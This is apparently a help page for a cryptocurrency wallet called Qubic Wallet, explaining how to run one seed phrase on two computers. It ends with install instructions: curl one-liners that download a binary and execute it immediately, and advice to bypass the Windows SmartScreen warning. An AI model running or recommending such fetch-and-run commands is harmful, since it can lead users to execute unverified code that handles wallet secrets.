> A second copy is not a backup. It is a second place the same secret can be lost.

Running the same Qubic Wallet seed on two computers works, because the account is derived rather than stored on a server. Both machines open the same account, see the same addresses and can send from it. Nothing synchronises between them: each keeps its own copy of the encrypted file, which means each file is a separate thing to protect, and either one can be lost without affecting the other.

## What stays the same

The seed, the derived addresses and the balance, because all three come from the same source. A transfer sent from one machine appears on the other after its next read, since both are reading the same network state.

## What differs

The local files. Each machine has its own `qwallet` folder with its own copy of the encrypted account, and each needs the password. The copies are independent: deleting one does not touch the other, and updating one does not update the other.

## How to set it up

Install on the second machine, choose restore, and enter the phrase with the password. That is the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-restore-account-seed.md">restore path</a>, and it is cleaner than copying the folder because it exercises the backup you actually depend on.

Copying the folder works too, which the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md">data folder guide</a> covers, and keeps derived addresses exactly as they were.

## The risk you just doubled

Two machines with the same key means two places where malware, a stolen laptop or a shared profile can reach it. A second device should be a deliberate decision about convenience, not a habit.

If both are online all the time, consider whether one of them needs the key at all: reading a balance needs no account.

## Keeping them honest

Keep both on the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>, because a stale build can derive differently, and write the phrase down once rather than inventing a second copy from memory.

## FAQ

### Can two computers use one account?

Yes. They are independent copies of the same key.

### Do they sync?

No. Both read the same network; neither talks to the other.

### If one machine dies, is the account gone?

No, as long as the other copy or the phrase survives.

### Should I copy the folder or restore?

Restoring proves the phrase works. Copying is faster. Doing both once is the safest order.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
